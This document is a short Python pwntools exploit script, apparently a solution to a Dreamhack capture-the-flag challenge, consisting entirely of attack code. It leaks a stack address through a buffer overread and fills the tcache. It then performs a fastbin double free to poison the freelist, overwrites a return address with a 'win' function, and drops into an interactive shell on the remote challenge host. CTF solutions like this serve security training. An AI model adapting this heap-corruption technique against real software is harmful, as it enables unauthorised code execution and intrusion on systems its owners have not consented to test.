from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 16275
r = remote(HOST, PORT)

win = 0x4012f6
cat_foods = 0x4040d0
def cook(name, idx, command=b'miow'):
    r.sendlineafter(b'? ', command)
    r.sendlineafter(b'? ', name)
    r.sendlineafter(b'? ', str(idx).encode())

def feed(idx):
    r.sendlineafter(b'? ', b'meow')
    r.sendlineafter(b'? ', str(idx).encode())

def exit():
    r.sendlineafter(b'? ', b'muow')

r.sendafter(b'? ', b'A'*32)
r.recvuntil(b'A'*32)
stack = u64(r.recv(6).ljust(8, b'\x00')) - 0x20

for i in range(7):
    cook(b'A', 0)
    feed(0)

cook(b'A', 0)
cook(b'B', 1)

feed(0)
feed(1)
feed(0)

cook(p64(stack), 0)

cook(b'C', 0)
cook(b'D', 0)

cmd = b'miowAAAA' + b'A'*16 + p64(0x41)
payload = b'A'*8 + p64(win)
cook(payload, 0, cmd)

exit()

r.interactive()